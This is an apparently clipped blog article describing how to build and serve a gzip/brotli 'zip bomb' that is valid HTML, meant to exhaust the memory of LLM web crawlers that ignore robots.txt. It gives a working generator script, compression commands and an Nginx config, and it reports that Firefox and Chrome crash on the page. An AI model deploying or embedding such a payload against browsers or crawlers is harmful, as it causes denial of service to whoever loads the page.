---
title: "A valid HTML zip bomb - ache"
notion_id: 2b754f1c-7d23-81e4-8c07-c727c772a536
notion_url: https://app.notion.com/p/A-valid-HTML-zip-bomb-ache-2b754f1c7d2381e48c07c727c772a536
last_edited: 2025-11-26T18:01:00.000Z
source_url: https://ache.one/notes/html_zip_bomb
tags: ["English", "Web Development", "Information Security", "HTML", "DevOps", "Article", "Kamil Grzybek"]
---
![image](https://ache.one/notes/res/zip_bomb_file.svg)

Illustration d'une bombe zip

Many sites have been affected by the aggressiveness of web crawlers designed to improve LLMs.

I’ve been relatively spared, but since the phenomenon started, I've been looking for a solution to implement.

Today, I present a zip bomb [gzip and brotli that is valid HTML](https://ache.one/bomb.html).

The initial problem is the aggressiveness of LLM web crawlers that don't respect `robots.txt`. The first idea that comes to mind is IP blocking. However, web crawlers have circumvented this restriction by using individual IPs via specialized botnets.

Another solution is therefore to exhaust the resources of the harvesters. With a zip bomb, we attempt to exhaust their RAM.[1](https://ache.one/notes/html_zip_bomb#user-content-fn-pro)

We’re exploiting the asymmetry of the resources needed to serve the zip bomb versus those needed to detect it. Naturally, I’m going to try to minimize the resources needed to distribute the zip bomb.

The most basic gzip bomb consists of zeros.

```plain text
$ dd if=/dev/zero bs=1M count=10240 | gzip -9 > 10G.gzip

```

That's not bad; the theoretical ratio is 1032:1 (approximately 1030 in practice for a zip bomb), so our file weighs ~10MiB.

The problem is that web browsers parse the page on the fly as soon as possible and quickly detect that it's not a valid HTML page.

So, I set myself the challenge of creating a valid HTML page containing a zip bomb.

I had several ideas. First, since it's an HTML page, we start with the HTML5 doctype. Then we try to fit the 10 MB of identical characters.

I first attempted to use [HTML classes, which can contain anything](https://shkspr.mobi/blog/2025/05/decorative-text-within-html/), but quickly the HTML comment solution seemed most practical. So, I set up a small shell script (in [fish](https://fishshell.com/)) to create an HTML file with a 10 MB 'H' comment.

```plain text
#!/bin/fish

# Base HTML
echo -n '<!DOCTYPE html><html lang=en><head><meta charset=utf-8><title>Projet: Valid HTML bomb</title><meta name=fediverse:creator content=@ache@mastodon.xyz><link rel=canonical href=https://ache.one/bomb.html><!--'

# Create a file filled with H
echo -n (string repeat --count 258 'H') >/tmp/H_258

# Lots of H
for i in (seq 507)
    # Concat H_258 with itself  times
    cat (yes /tmp/H_258 | head --lines=81925)
end

cat (yes /tmp/H_258 | head --lines=81924)

# End of HTML comment and body tag
echo -n "--><body><p>This is a HTML valid bomb, cf. https://ache.one/articles/html_zip_bomb</p></body>"

```

Then, we gzip all that:

```plain text
$ fish zip_bomb.fish | gzip -9 > bomb.html.gz
$ du -sb bomb.html.gz
10180	bomb.html.gz

```

We have our 1:1030 ratio, that’s perfect.

I use Nginx; the idea is to serve the pre-compressed file. Ideally, we don't even want the 10 GB file on the server.

To do that, we use the `ngx_http_gzip_static_module` [2](https://ache.one/notes/html_zip_bomb#user-content-fn-gzip_static_nginx).

```plain text
location = /bomb.html {
  gzip on; # Normally this should be the gzip module on the fly. 🤷
  gzip_static on;
  gzip_proxied expired no-cache no-store private auth;
  gunzip off; # Definitely don't decompress the gzip!

  brotli_static on;  # My site is available in brotli too, so why not.
}

```

Unfortunately, Nginx returns a 404 if the `bomb.html` file doesn't exist, so I created a small, simple file that announces that it’s a gzip bomb.

```plain text
$ curl https://ache.one/bomb.html
You don't support gzip encoding. Add the HTTP header "accept-encoding: gzip".

```

I verify that Nginx is serving the file correctly:

```plain text
$ curl -H "accept-encoding: gzip,br" -I -- https://ache.one/bomb.html | grep content
content-type: text/html; charset=utf-8
content-length: 8298
content-encoding: br
$ curl -H "accept-encoding: gzip" -I -- https://ache.one/bomb.html | grep content
content-type: text/html; charset=utf-8
content-length: 10420650
content-encoding: gzip

```

Okay, the size is right. Now we absolutely must make sure that we don’t exceed the budget of a legitimate web crawler by forbidding it in robots.txt. By placing it at the root, I know that my robots.txt already forbids it, but otherwise, we should find this:

```plain text
User-agent: *
Disallow: /bomb.html

```

Firefox struggles a lot and ends up crashing cleanly with an `NS_ERROR_OUT_OF_MEMORY` error, visible only in the developer tools. If I put the body tag before the malicious comment, I would certainly have a correctly displayed page.

Chrome is much faster to crash! It offers a happy screen signaling that an error occurred via `SIGKILL`.

In both cases, we notice that the page is partially loaded; however, the title is correct. Therefore, we are certain that a Selenium-type web crawler will crash on this HTML file. Fortunately, there appears to be no security vulnerability to exploit.

The HTML comment trick is certainly not the most elegant. I’m sure there are plenty of ideas to fit packs of 258 identical characters[3](https://ache.one/notes/html_zip_bomb#user-content-fn-max_paquet). However, here it seems to work so well that I haven’t taken the time to explore further. The interest of having a more varied HTML zip bomb would be to ensure that the HTML parser doesn’s optimize the reading of certain parts.

By the way, I allowed myself to create a brotli version as well. Since my site is available in brotli and the zip bomb is even more efficient in brotli, there’s no reason not to do it.
